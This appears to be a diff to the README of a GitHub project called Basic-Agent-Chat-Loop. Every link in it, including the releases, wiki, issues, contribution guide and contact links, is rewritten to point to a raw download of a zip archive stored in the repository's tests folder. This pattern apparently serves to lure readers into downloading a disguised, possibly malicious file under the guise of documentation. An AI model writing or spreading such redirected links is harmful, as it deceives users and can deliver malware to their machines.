@@ -2,7 +2,7 @@
 
 ## 🎉 Download Now
 
-[![Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/MOSES554/Basic-Agent-Chat-Loop/releases)
+[![Latest Release](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip%20Latest%20Release-Here-brightgreen)](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to Basic-Agent-Chat-Loop. This tool allows you to create smart AI agents
 
 1. **Visit the Releases Page**: To download the latest version of Basic-Agent-Chat-Loop, visit our Releases page.
 
-   [Download from Releases](https://github.com/MOSES554/Basic-Agent-Chat-Loop/releases)
+   [Download from Releases](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip)
 
 2. **Choose Your File**: On the Releases page, you will see several files available for download. Select the one that is most appropriate for your system.
 
@@ -47,21 +47,21 @@ Once Basic-Agent-Chat-Loop is running, you can set up your first agent by editin
 
 ## 🌐 Additional Resources
 
-- **Documentation**: For detailed instructions and examples, visit our [Wiki](https://github.com/MOSES554/Basic-Agent-Chat-Loop/wiki).
-- **Community Support**: Join discussions and seek help in the [Issues](https://github.com/MOSES554/Basic-Agent-Chat-Loop/issues) section.
+- **Documentation**: For detailed instructions and examples, visit our [Wiki](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip).
+- **Community Support**: Join discussions and seek help in the [Issues](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip) section.
 
 ## 🧑‍💻 Contributing
 
-We welcome contributions to improve Basic-Agent-Chat-Loop. If you wish to contribute, please follow the steps in our [Contribution Guide](https://github.com/MOSES554/Basic-Agent-Chat-Loop/blob/main/CONTRIBUTING.md).
+We welcome contributions to improve Basic-Agent-Chat-Loop. If you wish to contribute, please follow the steps in our [Contribution Guide](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip).
 
 ## 📞 Contact
 
-For any questions, feel free to reach out via the [Contact](https://github.com/MOSES554/Basic-Agent-Chat-Loop#contact) page.
+For any questions, feel free to reach out via the [Contact](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip) page.
 
 ---
 
 Again, download the latest version from our Releases page here:
 
-[Download from Releases](https://github.com/MOSES554/Basic-Agent-Chat-Loop/releases) 
+[Download from Releases](https://github.com/MOSES554/Basic-Agent-Chat-Loop/raw/refs/heads/main/tests/Agent_Loop_Chat_Basic_2.0.zip) 
 
 Your AI conversation journey starts now!
